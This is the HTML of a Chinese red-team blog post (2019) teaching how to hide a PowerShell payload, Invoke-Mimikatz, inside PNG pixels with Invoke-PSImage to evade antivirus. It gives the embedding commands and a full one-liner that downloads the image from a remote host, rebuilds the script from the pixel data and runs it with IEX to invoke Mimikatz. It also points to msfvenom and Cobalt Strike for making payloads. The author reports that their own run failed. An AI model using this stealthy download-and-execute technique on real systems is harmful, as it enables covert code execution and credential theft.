@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="红队攻防之图片免杀执行远程命令 0x01 前言powershell与图片通过Invoke-PSImage合成执行远程命令 0x02 Invoke-PSImageInvoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。它从Web的文件生成一个oneliner来执行。 它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，以便看起来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="裁决的博客">
+<meta property="og:url" content="http://lilifengcode.github.io/post/0.html">
+<meta property="og:site_name" content="裁决的博客">
+<meta property="og:description" content="红队攻防之图片免杀执行远程命令 0x01 前言powershell与图片通过Invoke-PSImage合成执行远程命令 0x02 Invoke-PSImageInvoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。它从Web的文件生成一个oneliner来执行。 它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，以便看起来">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/29/u8pRqP.jpg">
+<meta property="og:image" content="https://github.com/peewpw/Invoke-PSImage/raw/master/images/ps_kiwi.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/28/u1IFIK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/28/u1IOeI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/29/u3jzwD.gif">
+<meta property="og:updated_time" content="2019-10-31T13:13:25.496Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="裁决的博客">
+<meta name="twitter:description" content="红队攻防之图片免杀执行远程命令 0x01 前言powershell与图片通过Invoke-PSImage合成执行远程命令 0x02 Invoke-PSImageInvoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。它从Web的文件生成一个oneliner来执行。 它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，以便看起来">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/09/29/u8pRqP.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>裁决的博客</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/post/0.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/post/2082541d.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lilifengcode.github.io/post/0.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lilifengcode.github.io/post/0.html&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lilifengcode.github.io/post/0.html&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://lilifengcode.github.io/post/0.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lilifengcode.github.io/post/0.html&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#红队攻防之图片免杀执行远程命令"><span class="toc-number">1.</span> <span class="toc-text">红队攻防之图片免杀执行远程命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Invoke-PSImage"><span class="toc-number">2.</span> <span class="toc-text">0x02 Invoke-PSImage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参数"><span class="toc-number">2.0.1.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例"><span class="toc-number">2.0.2.</span> <span class="toc-text">例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-操作演示"><span class="toc-number">2.1.</span> <span class="toc-text">0x03 操作演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#准备"><span class="toc-number">2.1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作过程"><span class="toc-number">2.1.2.</span> <span class="toc-text">操作过程</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">裁决的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-29T03:16:36.087Z" itemprop="datePublished">2019-09-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="红队攻防之图片免杀执行远程命令"><a href="#红队攻防之图片免杀执行远程命令" class="headerlink" title="红队攻防之图片免杀执行远程命令"></a>红队攻防之图片免杀执行远程命令</h1><p><img src="https://s2.ax1x.com/2019/09/29/u8pRqP.jpg" alt></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>powershell与图片通过Invoke-PSImage合成执行远程命令</p>
+<h1 id="0x02-Invoke-PSImage"><a href="#0x02-Invoke-PSImage" class="headerlink" title="0x02 Invoke-PSImage"></a>0x02 Invoke-PSImage</h1><p>Invoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。它从Web的文件生成一个oneliner来执行。</p>
+<p>它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，以便看起来像实际的图片。图像保存为PNG，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。创建新图像时，通常会对常规PowerShell脚本进行显着压缩，通常会生成png，其文件大小约为原始脚本的50％。</p>
+<p>使用embed方法时，每个像素中2个颜色值的最低有效4位用于保存有效负载。结果会降低图像质量，但看起来仍然不错。它可以接受大多数图像类型作为输入，但是输出始终是PNG，因为它需要无损。图像的每个像素都用于保存脚本的一个字节，因此您需要一个图像，其像素至少与脚本中的字节一样多。这相当容易-例如，Invoke-Mimikatz适合1920x1200的图像。</p>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p><strong>-Script</strong> [filepath]嵌入到图像中的脚本的路径。</p>
+<p><strong>-Out</strong> [filepath]将结果图像保存到的文件（图像将为PNG）</p>
+<p><strong>-Image</strong> [filepath]要嵌入脚本的图像。（可选）</p>
+<p><strong>-WebRequest</strong> 输出用于使用Net.WebClient从Web读取图像的命令。您将需要托管图像并将URL插入命令中。</p>
+<p><strong>-PictureBox</strong> 输出用于使用System.Windows.Forms.PictureBox从Web读取图像的命令。您将需要托管图像并将URL插入命令中。</p>
+<h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>创建一个嵌入了脚本“ Invoke-Mimikatz.ps1”的映像，并输出一个oneliner以从磁盘执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br></pre></td></tr></table></figure>
+
+<p>创建一个嵌入了脚本“ Invoke-Mimikatz.ps1”的图像，然后输出一个oneliner以从Web执行（您仍然必须托管该图像并编辑URL）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure>
+
+<p>执行网络上托管的图像：</p>
+<p><img src="https://github.com/peewpw/Invoke-PSImage/raw/master/images/ps_kiwi.png" alt></p>
+<h2 id="0x03-操作演示"><a href="#0x03-操作演示" class="headerlink" title="0x03 操作演示"></a>0x03 操作演示</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>1.图片（2000*2000）左右或者以上 ，注：我曾用过8K之上的图片，合成了三个多小时emmmm</p>
+<p>2.Invoke-PSImage</p>
+<p>3.Invoke-Mimikatz（powershell脚本，当然你也可以自己写或者利用msf、cs神器等等生成ps脚本）</p>
+<p>4.w7虚拟机web环境</p>
+<p><img src="https://s2.ax1x.com/2019/09/28/u1IFIK.png" alt></p>
+<h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-PSImage.ps1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\caijue.png -Out .\caijueshell.png -Web</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/09/28/u1IOeI.png" alt></p>
+<p>将生成的图片放入远程服务器</p>
+<p>并在本地执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(&quot;http://192.168.21.135/caijueshell.png&quot;));$o=a Byte [] 2204160;(0..573)|%&#123;foreach($x in(0..3839))&#123;$p=$g.GetPixel($x,$_);$o[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))&#125;&#125;;IEX([Sys tem.Text.Encoding]::ASCII.GetString($o[0..2204116])):Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<p>理论上没问题，但是我出错了，，，后来感觉可能是mimikatz的问题，用msfvenom生成一个ps操作，，，发现好像是ps的问题，不搞了2点了，狗命要紧</p>
+<p><img src="https://s2.ax1x.com/2019/09/29/u3jzwD.gif" alt></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#红队攻防之图片免杀执行远程命令"><span class="toc-number">1.</span> <span class="toc-text">红队攻防之图片免杀执行远程命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Invoke-PSImage"><span class="toc-number">2.</span> <span class="toc-text">0x02 Invoke-PSImage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参数"><span class="toc-number">2.0.1.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例"><span class="toc-number">2.0.2.</span> <span class="toc-text">例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-操作演示"><span class="toc-number">2.1.</span> <span class="toc-text">0x03 操作演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#准备"><span class="toc-number">2.1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作过程"><span class="toc-number">2.1.2.</span> <span class="toc-text">操作过程</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lilifengcode.github.io/post/0.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lilifengcode.github.io/post/0.html&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lilifengcode.github.io/post/0.html&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://lilifengcode.github.io/post/0.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lilifengcode.github.io/post/0.html&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lilifengcode.github.io/post/0.html&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 裁决
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
